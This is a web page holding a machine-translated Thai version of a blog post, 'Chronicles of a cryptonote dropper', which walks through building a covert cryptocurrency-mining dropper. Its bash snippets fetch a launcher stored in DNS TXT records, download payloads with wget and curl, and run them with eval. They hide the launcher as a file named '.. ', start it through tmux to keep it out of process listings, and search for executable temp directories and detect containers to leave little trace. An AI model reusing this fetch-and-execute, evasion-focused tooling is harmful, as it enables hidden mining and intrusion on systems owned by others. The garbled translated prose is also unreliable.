-amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/th/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> พงศาวดารของหยด cryptonote</title><script type=application/ld+json>{"url":"/th/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/th/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-22T18:46:55.953","inLanguage":"th","name":"","mainEntityOfPage":{"@id":"/th/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/th/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/th/posts/><i class="fas fa-pen menu-icons"></i> โพสต์</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/th/media/><i class="fas fa-tv menu-icons"></i> สื่อ</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/th/posts/><i class="fas fa-pen menu-icons"></i> โพสต์</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/th/media/><i class="fas fa-tv menu-icons"></i> สื่อ</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/th/posts/chronichles_of_a_cryptonote_dropper> พงศาวดารของหยด cryptonote</a></h1><blockquote id=page-description style=font-style:italic>...คุณเต็มใจที่จะไปเพื่อ...เพนนีมากแค่ไหน?</blockquote></div><div class=franklin-content><p>สมมติว่าคุณต้องการขุด<a href=https://en.wikipedia.org/wiki/Cryptocurrency> สกุลเงินดิจิตอล</a> บนรีโมท<em> เสมือน</em> ฮาร์ดแวร์. คุณต้องหาอะไรให้ฉัน เซิร์ฟเวอร์ระยะไกลหมายถึงไม่<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> หรืออัลกอริธึมการพิสูจน์ GPU โดยทั่วไปเท่านั้น<a href=\posts/a-few-notes-on-proof-of-work> เหรียญที่เป็นมิตรของ CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> ซอฟต์แวร์</a></h2><p>ค้นหาและค้นหา<a href=https://github.com/xmrig/xmrig> คนขุดแร่</a> แต่มันไม่ค่อยดีเท่าไหร่ คุณต้องการบางสิ่งที่สามารถควบคุมได้ดีขึ้นจากระยะไกล ดังนั้นคุณจึงพบ<a href=https://github.com/Bendr0id/xmrigCC> คนงานเหมืองอื่น</a> . คุณยังต้องการ<a href=https://github.com/Bendr0id/xmrigcc-proxy> พร็อกซี่</a> เนื่องจากการเชื่อมต่อจำนวนมากจะมีอายุสั้น คุณจึงไม่ต้องการ<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> แหล่งรวมการขุดของคุณ ยัง a<a href=https://github.com/search?q=tunnel> อุโมงค์</a> จะดี.<h2 id=the_design><a class=header-anchor href=#the_design> การออกแบบ</a></h2><p>บ็อตเน็ตบางตัวใช้ข้อมูลบล็อคเชนเพื่อค้นหาคำสั่ง<a href=https://twitter.com/sarahjamielewis> ใครบางคน</a> ก็ดูเหมือนจะมี<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> แพ้พนัน</a> เรื่องนี้จะไม่เกิดขึ้นอีก...อย่างไรก็ตาม เราไม่ได้ซับซ้อนขนาดนั้น เราจะผ่านระเบียน DNS บางตัวที่เก็บสคริปต์ที่ดึงเพย์โหลดซึ่งตัวเองแตกไฟล์ในไดเร็กทอรี temp ที่รันและออก<em> เกือบ</em> ไม่มีร่องรอยของการตั้งค่า นี่คือผังงานขนาดเล็กที่แสดงโครงสร้าง<h2 id=launcher><a class=header-anchor href=#launcher>ตัวเปิด</a></h2><p>จุดประสงค์ของสคริปต์เริ่มต้นคือสามารถเข้าถึงได้และสามารถอัปเดตได้ง่ายซึ่งทนทานต่อการทดสอบของเวลา กำลังอัปเดต<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> บันทึกนั้นง่าย และ DNS เป็นสิ่งสุดท้ายที่ถูกปิดภายในเครือข่าย..เพราะที่อยู่ IP นั้นจำยาก...ดังนั้นโอกาสที่มันจะพร้อมใช้งานเกือบทุกครั้ง คุณจะเห็นเมื่อเราเป็น<em> กำลังเรียกสคริปต์การปรับใช้</em>ที่จริงแล้ว เราใช้ตรรกะบางอย่างอยู่แล้ว นี่คือสคริปต์ตัวเรียกใช้งาน มันต้องการความสามารถในการดำเนินการค้นหา DNS เพื่อค้นหาบันทึกของเรา DNS อาจแพร่หลาย แต่<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> ขุด</a> ไม่ใช่.<p>มีปริศนาเล็กน้อยที่นี่ หากเราต้องดาวน์โหลดเครื่องมืออื่น<em> เพื่อดาวน์โหลดสคริปต์อื่นเพื่อดาวน์โหลดเพย์โหลด</em> เราควรดาวน์โหลดเพย์โหลด! ในการป้องกัน...การเต้นสคริปต์นี้ช่วยเพิ่มความสับสน อนุญาตให้ใช้งานตัวเรียกใช้งานเพียงครั้งเดียว (ความสามารถในการบำรุงรักษา ใช่) ไม่จำเป็นเกือบทุกครั้ง.. ดังนั้นเราจึงให้บริการ a<a href=https://en.wikipedia.org/wiki/Standalone_program> เชื่อมโยงแบบสถิต</a> dig ปฏิบัติการได้เพื่อดำเนินการสืบค้น DNS ดึงข้อมูลโดยโฮสต์ด้วยตนเองหรือโฮสต์บนคลาวด์ (ใช่ มีทางเลือกเช่น 3 หรือ 4 เนื่องจากบริการคลาวด์มีแบนด์วิดท์ฟรีน้อยมาก และยังต้องใช้คุกกี้หรือโทเค็นการเข้าถึง...มันเป็นสคริปต์มาก ไม่เป็นมิตรตั้งใจอย่างนั้น แน่นอน)<p>มีอะไรอยู่ในระเบียน DNS เราใช้<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> บันทึกในโดเมนที่กำหนดเอง (ทางเลือกที่นี่ด้วย) ทำไมต้อง TXT? เป็นที่เก็บข้อมูลได้มากที่สุด..โดยปกติเพราะเป็นประเภท<a href=https://www.ietf.org/rfc/rfc6763.txt> ที่แนะนำ</a> ขึ้นอยู่กับ<em> สิ่งของ</em> . เราใช้เฉพาะ<a href=https://www.cloudflare.com/> cloudflare</a> สำหรับ DNS ของเราเล่นซอเพราะมันฟรีและเป็นผู้เล่นเพียงคนเดียวในเมือง (<em> ไม่ได้จริงๆ แต่มีทางเลือกอื่น ๆ ที่ฉลาด</em> ). มันเกิดขึ้นที่คุณสามารถจัดเก็บข้อมูลได้หลายชิ้นบน<em> เหมือนกัน</em> บันทึก...สิ่งนี้เริ่มสับสนและแย่งชิงคุณสมบัติบางอย่าง...(สัมผัสกัน) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> เคย</a> อนุญาต<em> ถูกล่ามโซ่</em>TXT บันทึกรวม ~9k ไบต์ ตอนนี้เอกสารระบุ ~2k ไบต์ ก่อนการเปลี่ยนแปลงฉันใช้ ~6k ฉันคิดว่า และให้บริการสคริปต์ที่ไม่มีการบีบอัด หลังจากนั้นฉันต้องทำให้สคริปต์บางลงและบีบอัดก่อนถึงมือ (จริงๆ แล้วฉัน ลองใช้ a<a href=https://freedns.afraid.org/> freedns</a> ผู้ให้บริการฉันถูกแบนภายในหนึ่งวันโดยเดาว่าพวกเขามีนโยบายบันทึก TXT ที่ไม่มีไขมันอย่างเข้มงวด) อย่างไรก็ตามการบีบอัด gzip ดูเหมือนจะไม่เป็นมิตรกับไปป์และยังคงก่อให้เกิดปัญหาดังนั้นฉันจึงต้องจัดการเพื่ออัดสคริปต์โดยไม่มีการบีบอัด ( ปลายแทนเจนต์)<p>เราจะเก็บมันอย่างไร? ระเบียน TXT รองรับเฉพาะสตริงที่เป็นตัวอักษรและตัวเลขเท่านั้น ไม่ใช่<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> ดังนั้นเราจึงต้องรวมมันไว้ในการเข้ารหัสที่ไม่ใช่ค่าว่าง<a href=https://en.wikipedia.org/wiki/Base64> ฐาน64</a> เป็นไปตามข้อจำกัดนี้ และเนื่องจากเรากำลังจัดเก็บ<em> ถูกล่ามโซ่</em> บันทึก TXT เราต้องแยกเอาท์พุต เนื่องจากเราใช้เชลล์ สิ่งนี้ทำได้ผ่าน<code>-w</code> ตั้งค่าสถานะบน busybox ค่าสถานะดังกล่าวเคยขาดหายไป (หรือเลือกใช้) ในเวอร์ชันเก่าซึ่งน่ารำคาญ อีกทางเลือกหนึ่งคือใช้ตัวเข้ารหัสที่มาพร้อมกับ openssl<code>openssl enc -base64</code>.<p>ตอนนี้เรารู้วิธีจัดเก็บสคริปต์การปรับใช้แล้ว เราก็เก็บมันไว้ด้วย<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> หรือด้วยตนเอง เราจะดึงมันได้อย่างไร? เราบอกว่าเราต้องการ bindutils หรือของเราเอง<code>dig</code> ...หลังจากเลือกจุดสิ้นสุดการให้บริการแล้ว เราต้องการดาวน์โหลด โดยปกติแล้ว สิ่งที่มีให้คือ<a href=https://www.gnu.org/software/wget/> wget</a> หรือ<a href=https://curl.se/> curl</a> , wget ถูกติดตั้งไว้ล่วงหน้าบ่อยกว่ามาก อย่างไรก็ตาม busybox ให้การสนับสนุน tls กับไลบรารีไดนามิกเท่านั้น ดังนั้นคุณต้องตรวจสอบให้แน่ใจว่าจุดปลายให้บริการ http หรือยูทิลิตี้ของคุณเป็น<code>wget</code> จาก gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>แปลว่า พยายาม<code>-t2</code> เวลาที่รอคอย<code>-T10</code> วินาทีที่เป็น<code>-q</code> การอ่านอย่างเงียบ ๆ จาก<code>-i-</code> มาตรฐาน (<code>$digurl</code> ) และเขียนถึง<code>-O-</code> stdout (<code>$filename</code>). คำสั่งนี้ไม่ได้เปิดเผยสิ่งที่เรากำลังดาวน์โหลดในแวบแรก เราจะระมัดระวังกับคำสั่งเชลล์อื่น ๆ ด้วยเหตุผลเดียวกันหรือติดกับเชลล์ (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> ทุบตี</a> ) ในตัวหากเป็นไปได้ ระวังด้วยว่าคุณกำลังดาวน์โหลดไฟล์ปฏิบัติการของคุณไปที่ใด คุณต้องแน่ใจว่าคุณสามารถดำเนินการได้ เนื่องจากจุดเชื่อมต่อบางจุด โดยเฉพาะอย่างยิ่งในคอนเทนเนอร์และ<code>tmp</code> เส้นทางคือ<code>noexec</code> . ตอนนี้เรามีเครื่องมือสืบค้น DNS แล้ว เราดึงข้อมูลบันทึกของเรา<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>ธงอธิบายตนเองได้ที่นี่<code>+short</code> หมายความว่าเราสนใจเฉพาะข้อมูลเท่านั้น เพื่อที่เราจะได้ไม่ต้องแยกวิเคราะห์ผลลัพธ์ การระบุเซิร์ฟเวอร์ DNS เป็นสิ่งสำคัญ เช่น google (<code>8.8.8.8</code> ) หรือ cloudflare (<code>1.1.1.1</code> ) เนื่องจากหลายสภาพแวดล้อมเปลี่ยนเส้นทางหรือค้นหาพร็อกซี DNS ไปยังเซิร์ฟเวอร์ DNS ของตนเองโดยค่าเริ่มต้น หลังจากดึงสคริปต์แบบกลุ่มแล้ว เราจะจัดการกับเครื่องหมายคำพูดและช่องว่างเพื่อให้พร้อมสำหรับการถอดรหัส<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>จะเป็นอย่างไรถ้าตอนนี้เรา<em> นิ่ง</em> ไม่มีตัวเรียกใช้ของเรา? DNS นั้นยุ่งเหยิง เราต้องการทางเลือกสำรอง ให้ตั้งค่าโดเมนย่อยเพื่อดึงสคริปต์ตัวเรียกใช้งานโดยตรง ก่อนการประเมินสคริปต์ของเรา เราต้องการปรับแต่งสคริปต์ด้วยตัวแปรบางตัว ให้ลองใช้ระเบียน TXT อีกครั้งเพื่อจัดเก็บรายการตัวแปร NAME=VALUE และแยกวิเคราะห์ นอกจากนี้ยังมีทางเลือกสำรองสำหรับตัวแปร cloudflare เสนอการเปลี่ยนเส้นทางตาม URL การเปลี่ยนเส้นทางเหล่านี้ให้บริการ<em> ก่อน</em> ปลายทาง ดังนั้นเราจึงไม่ต้องการจุดปลาย เราแค่ต้องการกำหนดค่ากฎการเปลี่ยนเส้นทางตาม regex ไปยังปลายทางที่สมมติขึ้น สิ่งที่เราสนใจคือพารามิเตอร์ของ URL<code>?NAME=VALUE&NAME2=VALUE2...</code>เพื่อให้เราสามารถกำหนดพารามิเตอร์ตัวเรียกใช้งานของเราได้ง่ายๆ โดยเปลี่ยน URL การเปลี่ยนเส้นทาง โดยให้ความสำคัญกับการอ้างอิงและหลีกเลี่ยงโค้ดเสมอ<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>เดอะ wget<code>-S</code> พิมพ์ URL การเปลี่ยนเส้นทางที่เราสนใจสำหรับการแยกวิเคราะห์ เมื่อมีพารามิเตอร์และสคริปต์ เราจะประเมินตัวแปรที่เขียนทับไฟล์<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>ไฟล์นี้จะมาจากสคริปต์การปรับใช้ ส่วนสุดท้ายของสคริปต์เริ่มต้นคือการทำให้จริง<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> แทรมโพลีน</a> ประเมินสคริปต์ภายในกระบวนการเชลล์ปัจจุบัน หรืออาจปล่อยให้จัดการโดย tmux ถ้าเป็นไปได้<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>สคริปต์ตัวเรียกใช้งานถูกดัมพ์ไปยังไฟล์ชื่อ ".. " ซึ่งดูสับสนเพราะอาจเข้าใจผิดว่าเป็น<em> พ่อแม่</em> ไดเรกทอรี และเราไม่รวมคำสั่ง session เนื่องจากคำสั่งนั้นจะคงอยู่ในคำสั่ง process แต่เราเริ่มเซสชัน tmux ล่วงหน้าและส่งคำสั่ง source ผ่านอินเตอร์เฟสเทอร์มินัล tmux เกี่ยวข้องกับสิ่งนี้บางครั้งเรียกไฟล์ปฏิบัติการด้วย<code>./</code> เก็บตัวอักษรเหล่านั้นไว้ในคำสั่ง ดังนั้นจึงเป็นการดีกว่าที่จะเพิ่ม<code>$PWD</code> สู่เส้นทาง..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> น้ำหนักบรรทุก</a></h2><p>สคริปต์การปรับใช้ของเราเริ่มต้นด้วยการจัดหา<code>env.sh</code> ไฟล์และการรักษาหรือกำหนดค่า vars as<code>STARTING_*</code> vars like<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>ซึ่งช่วยให้เราสามารถฆ่าและรีสตาร์ทอินสแตนซ์ที่ทำงานอยู่ขณะรีเซ็ตสภาพแวดล้อม ให้เปลี่ยนเป็นไดเร็กทอรี tmp ที่มีความสามารถ exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>ตรวจสอบว่าภายใน a<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> คอนเทนเนอร์</a> ก็สะดวกเช่นกัน เราสามารถสำรวจระบบไฟล์เพื่อหาคำใบ้ได้<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>ตอนนี้ได้เวลาดาวน์โหลด payload ของเราแล้ว เราเลือกที่จะรองรับทั้ง wget และ curl เรารู้วิธีใช้ wget ด้วยแฟล็กที่ระมัดระวังแล้ว สำหรับ curl มันแตกต่างกันเล็กน้อย เราต้องสร้างไฟล์ปรับแต่งและแทนที่<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>ขั้นตอนสุดท้ายเป็นเพียงการแยกส่วนของข้อมูลออก<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>เป็นมูลค่าการกล่าวขวัญถึงการใช้ [CDN] เพื่อให้บริการเพย์โหลด ที่นี่อีกครั้ง cloudflare เพื่อช่วยเหลือช่วยเราจากการใช้จ่ายแบนด์วิดธ์ เพียงเปลี่ยนชื่อเพย์โหลดที่บีบอัดของเราด้วย a<em> นามสกุลไฟล์</em> รองรับโดย cloudflare...มันจะกลายเป็นแคช Cloudflare ไม่ได้ตรวจสอบส่วนหัวของสิ่งที่ให้บริการ อาจเป็นเพราะการทำเช่นนั้นในระดับนั้นไม่สามารถทำได้<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> ผจญภัยใน Bashland</a></h2><p>Bash ได้รับเลือกด้วยสมมติฐานว่าพกพาสะดวก ดูไม่แปลกและแพร่หลายกว่าเมื่อเปรียบเทียบกับภาษาสคริปต์อื่นๆ เช่น Perl, ruby ​​หรือ python ความจริงก็คือว่าไบนารีแบบสแตนด์อโลนที่เขียนด้วย golang หรือ lua น่าจะง่ายกว่ามาก มีบั๊กน้อยกว่า และดูแลรักษาง่ายกว่า โดยพื้นฐานแล้ว bash เป็นตัวเลือกที่แย่ที่สุด ในการป้องกันของฉัน เมื่อถึงเวลาที่ฉันเกาคันจำนวนมากด้วย bash มันสายเกินไปสำหรับการเขียนใหม่ และมันก็เริ่มน่าเบื่อเช่นกัน<p>นอกจากนี้ยังมีตัวเลือกในการใช้ busybox กับแฟล็กเวลาคอมไพล์เพื่อใช้บิวอินทั้งหมด (เช่น grep และ sed) อย่างไรก็ตาม การใช้บิวด์อินด้วยวิธีนี้จะไม่อนุญาตให้วางไข่งาน (ทางแยก) และทำให้ daemon เผชิญกับการหยุดชะงักที่อาจเกิดขึ้น<p>ฉันจะอธิบายฟังก์ชั่นทุบตีที่นี่พร้อมรายการทั้งหมดที่มีอยู่<a href=\assets/posts/bash_functions.txt> ที่นี่</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>ใช้<code>RANDOM</code> เพื่อให้ได้ตัวเลขระหว่าง 97-122 ที่สอดคล้องกับรหัสอักขระ printf ควรเป็น buildin เราไม่ต้องการแยกภายในลูป<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
